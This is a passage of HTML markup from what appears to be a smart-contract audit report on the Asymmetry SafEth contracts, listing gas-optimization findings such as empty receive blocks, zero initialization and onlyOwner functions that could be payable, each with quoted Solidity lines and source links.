6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">: </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">: </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L66\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L66</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L77\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L77</a></p>\n<h2 id=\"g-03-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#g-03-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"g 03 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Empty Blocks Should Be Removed Or Emit Something</h2>\n<p>The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (if(x){}else if(y){…}else{…} => if(!x){if(y){…}else{…}})</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">: </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L246\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L246</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">: </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L244\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L244</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">: </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L126\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L126</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">: </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L97\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L97</a></p>\n<h2 id=\"g-04-using-delete-statement-can-save-gas\" style=\"position:relative;\"><a href=\"#g-04-using-delete-statement-can-save-gas\" aria-label=\"g 04 using delete statement can save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Using <code>delete</code> statement can save gas</h2>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L68\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L68</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L170\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L170</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L190\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L190</a></p>\n<h2 id=\"g-05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g-05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g 05 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier or require such as onlyOwner/onlyX is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rebalanceToWeights</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L138\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L138</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">adjustWeight</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L165\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L165</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addDerivative</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_contractAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L182\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L182</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L202\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L202</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L214\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L214</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L223\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L223</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPauseStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pause</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L232\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L232</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPauseUnstaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pause</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L241\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L241</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L58\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L58</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L107\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L107</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L156\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L156</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L51\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L51</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L60\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L60</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L94\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L94</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxSlippage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L48\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L48</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L56\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L73\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L73</a></p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 